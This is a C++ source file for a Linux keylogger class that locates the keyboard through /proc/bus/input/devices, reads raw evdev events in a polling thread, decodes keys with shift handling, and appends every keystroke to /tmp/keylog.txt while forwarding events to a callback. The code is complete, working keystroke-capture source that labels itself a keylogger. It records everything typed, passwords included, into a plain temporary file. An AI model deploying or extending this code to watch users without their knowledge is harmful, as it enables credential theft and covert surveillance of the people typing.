#include "LinuxEvdevLogger.hpp"
#include <iostream>
#include <fcntl.h>
#include <unistd.h>
#include <linux/input.h>
#include <cstring>
#include <chrono>
#include <poll.h>
#include <errno.h>

namespace platform {
namespace linux_os {

    // === Legacy Key Map ===
    static const char *key_map[256] = {
        "RESERVED", "ESC", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "-", "=", "BACKSPACE",
        "TAB", "q", "w", "e", "r", "t", "y", "u", "i", "o", "p", "[", "]", "ENTER", "L_CTRL",
        "a", "s", "d", "f", "g", "h", "j", "k", "l", ";", "'", "`", "L_SHIFT", "\\", "z", "x", "c", "v", "b", "n", "m", ",", ".", "/", "R_SHIFT",
        "KP*", "L_ALT", "SPACE", "CAPS_LOCK", "F1", "F2", "F3", "F4", "F5", "F6", "F7", "F8", "F9", "F10", "NUM_LOCK", "SCROLL_LOCK",
        "KP7", "KP8", "KP9", "KP-", "KP4", "KP5", "KP6", "KP+", "KP1", "KP2", "KP3", "KP0", "KP.",
        // Truncated for common usage, safe as ev.code checked < 256
    };

    static char get_shifted_char(const char* key) {
        if (strlen(key) != 1) return 0;
        char c = key[0];
        if (c >= 'a' && c <= 'z') return c - 32;
        if (c == '1') return '!';
        if (c == '2') return '@';
        if (c == '3') return '#';
        if (c == '4') return '$';
        if (c == '5') return '%';
        if (c == '6') return '^';
        if (c == '7') return '&';
        if (c == '8') return '*';
        if (c == '9') return '(';
        if (c == '0') return ')';
        if (c == '-') return '_';
        if (c == '=') return '+';
        if (c == '[') return '{';
        if (c == ']') return '}';
        if (c == ';') return ':';
        if (c == '\'') return '"';
        if (c == ',') return '<';
        if (c == '.') return '>';
        if (c == '/') return '?';
        if (c == '\\') return '|';
        if (c == '`') return '~';
        return 0;
    }

    LinuxEvdevLogger::LinuxEvdevLogger() {}
    LinuxEvdevLogger::~LinuxEvdevLogger() { stop(); }

    void LinuxEvdevLogger::stop() {
        if (!running_.load()) return;
        running_.store(false);
        if (thread_.joinable()) thread_.join();
        if (fd_ >= 0) {
            close(fd_);
            fd_ = -1;
        }
        if (log_file_.is_open()) {
            log_file_.close();
        }
    }

    common::EmptyResult LinuxEvdevLogger::start(std::function<void(const interfaces::KeyEvent&)> cb) {
        if (running_.load()) {
            std::cout << "[Keylogger] Already running" << std::endl;
            return common::Result<common::Ok>::success();
        }

        std::cout << "[Keylogger] Starting..." << std::endl;

        if (!find_keyboard()) {
            std::cerr << "[Keylogger] ERROR: No keyboard device found in /proc/bus/input/devices" << std::endl;
            return common::Result<common::Ok>::err(common::ErrorCode::DeviceNotFound, "No keyboard found");
        }

        std::cout << "[Keylogger] Found keyboard at: " << device_path_ << std::endl;

        if (!open_device()) {
            std::cerr << "[Keylogger] ERROR: Cannot open " << device_path_ << " - Permission denied?" << std::endl;
            std::cerr << "[Keylogger] TIP: Run 'sudo usermod -aG input $USER' and restart session" << std::endl;
            return common::Result<common::Ok>::err(common::ErrorCode::PermissionDenied, "Cannot open " + device_path_);
        }

        std::cout << "[Keylogger] Device opened successfully (fd=" << fd_ << ")" << std::endl;

        // Open Log File
        log_file_.open("/tmp/keylog.txt", std::ios::app);

        running_.store(true);
        thread_ = std::thread(&LinuxEvdevLogger::run_loop, this, cb);
        std::cout << "[Keylogger] Event loop thread started" << std::endl;
        return common::Result<common::Ok>::success();
    }

    // Reuse legacy find_keyboard logic (Full Port)
    bool LinuxEvdevLogger::find_keyboard() {
         FILE *fp = fopen("/proc/bus/input/devices", "r");
         if (!fp) return false;

         char line[512];
         char name[512] = "Unknown";
         char handlers[512] = "";
         std::string best_device;

         while (fgets(line, sizeof(line), fp)) {
             // 1. Capture Name
             if (strncmp(line, "N: Name=", 8) == 0) {
                 sscanf(line, "N: Name=\"%511[^\"]\"", name);
             }

             // 2. Capture Handlers
             if (strncmp(line, "H: Handlers=", 12) == 0) {
                 strncpy(handlers, line + 12, sizeof(handlers)-1);
                 handlers[sizeof(handlers)-1] = 0;
                 // Strip newline
                 handlers[strcspn(handlers, "\n")] = 0;

                 // Logic: Must have 'kbd' AND 'event'
                 if (strstr(handlers, "kbd") && strstr(handlers, "event")) {
                     char *p = strstr(handlers, "event");
                     int id;
                     if (p && sscanf(p, "event%d", &id) == 1) {
                         // We found a candidate.
                         // Legacy logic favored the "last" one found (often USB plug-in).
                         // Also printed "Candidate: name -> dev"
                         best_device = "/dev/input/event" + std::to_string(id);
                     }
                 }
             }

             // Reset on empty line
             if (line[0] == '\n') {
                 strcpy(name, "Unknown");
             }
         }
         fclose(fp);

         if (!best_device.empty()) {
             device_path_ = best_device;
             return true;
         }

         // Fallback
         device_path_ = "/dev/input/event0";
         return true;
    }

    bool LinuxEvdevLogger::open_device() {
        fd_ = open(device_path_.c_str(), O_RDONLY);
        return (fd_ >= 0);
    }

    void LinuxEvdevLogger::run_loop(std::function<void(const interfaces::KeyEvent&)> callback) {
        struct input_event ev;
        bool shift_pressed = false;
        int event_count = 0;

        // Use poll() for non-blocking reads with timeout
        struct pollfd pfd;
        pfd.fd = fd_;
        pfd.events = POLLIN;

        std::cout << "[Keylogger] Event loop running, waiting for keypresses..." << std::endl;

        while (running_.load()) {
            // Poll with 100ms timeout to check running_ periodically
            int poll_result = poll(&pfd, 1, 100);

            if (poll_result < 0) {
                if (errno == EINTR) continue; // Interrupted, retry
                std::cerr << "[Keylogger] poll() error: " << strerror(errno) << std::endl;
                break;
            }

            if (poll_result == 0) {
                // Timeout, no data - just check running_ and loop
                continue;
            }

            // Data available
            ssize_t n = read(fd_, &ev, sizeof(ev));
            if (n <= 0) {
                if (errno == EAGAIN || errno == EWOULDBLOCK) continue;
                std::cerr << "[Keylogger] read() failed: " << strerror(errno) << std::endl;
                break;
            }

            if (ev.type == EV_KEY) {
                if (ev.code >= 256 || !key_map[ev.code]) continue;

                std::string k_str = key_map[ev.code];

                // Handle Shift
                if (k_str == "L_SHIFT" || k_str == "R_SHIFT") {
                    shift_pressed = (ev.value == 1 || ev.value == 2);
                    continue;
                }

                if (ev.value == 1 || ev.value == 2) {
                     if (k_str == "SPACE") k_str = " ";
                     else if (k_str == "ENTER") k_str = "\n";
                     else if (k_str == "TAB") k_str = "\t";
                     else if (k_str.length() == 1) {
                         if (shift_pressed) {
                             char s = get_shifted_char(k_str.c_str());
                             if (s) k_str = std::string(1, s);
                             else if (k_str[0] >= 'a' && k_str[0] <= 'z') k_str[0] -= 32;
                         }
                     }

                     interfaces::KeyEvent e;
                     e.key_code = ev.code;
                     e.is_press = (ev.value == 1);
                     e.timestamp = ev.time.tv_sec * 1000 + ev.time.tv_usec / 1000;
                     e.text = k_str;

                     // Write to file
                     if (this->log_file_.is_open()) {
                         this->log_file_ << k_str << std::flush;
                     }

                     event_count++;
                     if (event_count == 1) {
                         std::cout << "[Keylogger] First key event captured: '" << k_str << "'" << std::endl;
                     }

                     callback(e);
                }
            }
        }

        std::cout << "[Keylogger] Event loop stopped. Total events: " << event_count << std::endl;
    }

} // namespace linux_os
} // namespace platform
